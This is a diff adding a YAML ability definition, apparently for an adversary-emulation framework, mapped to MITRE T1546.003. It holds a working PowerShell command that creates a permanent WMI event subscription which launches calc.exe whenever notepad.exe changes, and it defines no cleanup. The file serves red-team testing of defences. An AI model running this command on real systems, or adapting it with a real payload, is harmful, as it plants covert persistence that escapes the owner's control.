@@ -1,0 +1,38 @@
+- tactic: persistence
+  technique_name: 'Event Triggered Execution: WMI Permanent Event Subscription'
+  technique_id: T1546.003
+  name: WMI Permanent Event Subscription
+  description: This ability creates a permanent WMI event subscription to achieve
+    persistence on the target system.
+  executors:
+  - name: windows
+    platform: psh
+    command: powershell -Command "$Filter = Set-WmiInstance -Namespace 'root\subscription'
+      -Class __EventFilter -Arguments @{Name='EventFilter'; EventNamespace='Root\Cimv2';
+      QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN
+      60 WHERE TargetInstance ISA "Win32_Process" AND TargetInstance.Name="notepad.exe"'};
+      $Consumer = Set-WmiInstance -Namespace 'root\subscription' -Class CommandLineEventConsumer
+      -Arguments @{Name='CommandLineConsumer'; CommandLineTemplate='calc.exe'}; Set-WmiInstance
+      -Namespace 'root\subscription' -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;
+      Consumer=$Consumer}"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - persistence
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: stockpile
+  delete_payload: true
+  id: 72ca2e38-fcd7-42b5-944c-e96c97edce34
